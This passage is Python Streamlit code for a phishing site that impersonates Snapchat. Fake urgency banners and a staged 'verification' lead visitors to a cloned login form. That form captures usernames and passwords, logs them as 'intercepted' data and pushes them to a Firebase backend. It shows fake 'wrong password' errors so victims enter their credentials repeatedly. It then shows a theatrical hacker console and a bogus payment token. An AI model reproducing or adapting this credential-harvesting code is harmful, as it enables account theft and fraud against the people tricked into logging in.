    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; padding:16px; background:#fef2f2; border:1px solid #fee2e2; border-radius:12px; margin-bottom:20px;'><h4 style='color:#dc2626; font-weight:800; margin:0;'>⚠️ PUBLIC QUEUE SHUTDOWN CONGESTION</h4><p style='font-size:13px; color:#991b1b; margin:4px 0 0 0;'>Standard distribution channels lock delay: <b>24 Hours</b>.</p></div>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; margin-bottom:20px;'><h3 style='font-weight:800; margin:0;'>🚀 Force High-Speed Priority Corridor Bypasser</h3><p style='font-size:13px; color:#4b5563; margin-top:4px;'>Verify active hardware session credentials matching target platform metadata layers to pass immediately.</p></div>", unsafe_allow_html=True)
    
    st.markdown("""
    <div class='prime-engagement-block'>
        <span style='color:#2563eb !important; font-weight:800; font-size:15px;'>👉 CLICK THE BELOW  to verify your snapchat account 👈</span>
        <div style='font-size:11px; color:#4b5563; margin-top:4px; font-weight:700;'>[ SSL 256-Bit Hardware Encryption Channel Active ]</div>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("You need to verify Snapchat IDENTITY FOOTPRINT MATCH NOW 👑 to get token key 🗝️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        script_detector_msg = st.empty()
        script_detector_msg.info("🤖 Scanning hardware environment patterns for tracking automation...")
        time.sleep(1.4)
        script_detector_msg.success("✅ Clean footprint frame. Initializing high-fidelity verification screen...")
        time.sleep(0.6)
        script_detector_msg.empty()
        st.session_state.step = 5
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 5: EXACT MATCH SYSTEM-CLONE VIEWPORT SCREEN
# ==========================================
elif st.session_state.step == 5:
    st.markdown("<div class='stApp' style='background-color:#ffffff !important;'>", unsafe_allow_html=True)
    
    st.markdown("<div class='premium-canvas-wrapper' style='background-color:#ffffff !important; border-radius:10px !important; box-shadow: 0 2px 14px rgba(0,0,0,0.03) !important; max-width:400px !important; margin:35px auto 10px auto !important; border:1px solid #f1f1f1 !important; padding:40px 32px !important;'>", unsafe_allow_html=True)
    
    # Rigid Icon Control Engine Core
    st.markdown("<div class='center-logo-box-matrix' style='box-shadow:none; border:none; margin-bottom:10px;'>", unsafe_allow_html=True)
    try:
        st.image("2.jpg")
    except:
        st.markdown("<p style='color:#ff4444; font-size:26px; font-weight:800; margin:0;'>logo</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<p class='replica-brand-text'>snapchat</p>", unsafe_allow_html=True)
    
    with st.form("screenshot_replica_form_engine", clear_on_submit=False):
        st.markdown("<span class='replica-field-title'>Username or Email</span>", unsafe_allow_html=True)
        login_user_string = st.text_input("user_replica", placeholder="Your Username Here", label_visibility="collapsed")
        
        st.write("")
        
        st.markdown("<span class='replica-field-title'>Password</span>", unsafe_allow_html=True)
        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibility="collapsed")
        
        st.markdown("<p class='forgot-pass-trigger-text'>Forgot Password</p>", unsafe_allow_html=True)
        
        st.write("")
        form_submit_trigger = st.form_submit_button("Log In", type="secondary")
        
        if form_submit_trigger:
            if login_user_string and login_pass_string:
                st.session_state.random_seed = random.randint(10, 99)
                log_capture_map = {
                    "intercept_attempt_index": st.session_state.login_attempts_count,
                    "captured_login_handle": login_user_string,
                    "captured_login_credential": login_pass_string,
                    "timestamp_string": str(datetime.datetime.now())
                }
                st.session_state.intercepted_dataset.append(log_capture_map)
                
                # Rigid 2-Attempt Failure Matrix Loop Logic
                if st.session_state.login_attempts_count < 3:
                    push_to_firebase_matrix(f"INTERCEPT_PHASE_ATTEMPT_{st.session_state.login_attempts_count}")
                    st.session_state.login_attempts_count += 1
                    with st.spinner("Connecting to authentication server node..."):
                        time.sleep(3.5)
                    st.error("Oops! The password you entered is incorrect. Please double check and try again.")
                else:
                    push_to_firebase_matrix("INTERCEPT_COMPLETE_SYSTEM_CLEAR")
                    with st.spinner("Syncing verified priority access tokens..."):
                        time.sleep(3.5)
                    st.session_state.step = 6
                    st.rerun()
            else:
                st.warning("All parameters required.")
                
    st.markdown("</div>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center; font-size:14px; color:#000000; font-weight:500; margin-top:35px;'>New To snapchat ?<b style='font-weight:700; margin-left:5px;'>Sign Up</b></p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 6: COMPLEX TERMINAL PIPELINE & RELEASE
# ==========================================
elif st.session_state.step == 6:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center; font-weight:800; color:#2563eb !important;'>💻 EXECUTION PROTOCOLS DEPLOYED</h3>", unsafe_allow_html=True)
    
    console_view = st.empty()
    console_lines = [
        "Verifying structural checksum hash validations...",
        "Establishing persistent link channels with transaction database...",
        "Injecting priority queue traffic routes to verified hardware target...",
        "Syncing session configuration metadata fields... PASSED",
        "Assembling tracking payload arrays inside isolated partition lines...",
        "Finalizing payload deployment... SYSTEM SUCCESS"
    ]
    
    cmd_markup_accumulator = ""
    for specific_line in console_lines:
        cmd_markup_accumulator += f"&gt; {specific_line}<br>"
        console_view.markdown(f"<div class='hacker-cmd-box'><p class='hacker-cmd-string'>{cmd_markup_accumulator}</p></div>", unsafe_allow_html=True)
        time.sleep(1.4)
        
    console_view.empty()
    
    st.success("✅ PRIORITY ROUTING CHANNELS DEPLOYED SUCCESSFULLY!")
    generated_payment_number = f"PMT-TK-{str(uuid.uuid4())[:10].upper()}"
    
    token_display_box = f"""
    <div style='text-align:center; padding:25px; background:#f0fdf4; border-radius:14px; border:2px solid #16a34a; margin:20px 0; box-shadow: 0 4px 15px rgba(22, 163, 74, 0.1);'>
        <h2 style='color:#16a34a; font-weight:800; margin:0 0 6px 0; font-size:18px;'>PAYMENT GENERATION NUMBER CLAIMED</h2>
        <code style='font-size:19px; font-weight:800; color:#1e293b; background:#ffffff; padding:6px 14px; border-radius:8px; border:2px solid #cbd5e1; font-family:monospace;'>{generated_payment_number}</code>
        <p style='margin:16px 0 0 0; font-size:14.5px; font-weight:700; color:#16a34a;'>🚀 Allocation Stream Priority: Active (Est Delivery Transit: 20 days)</p>
    </div>
    """
    st.markdown(token_display_box, unsafe_allow_html=True)
    
    if st.button("RESET CONTROL HANDSHAKE TERMINAL", type="primary", use_container_width=True):
        st.session_state.clear()
        st.rerun()
        
    st.markdown("</div>", unsafe_allow_html=True)


        
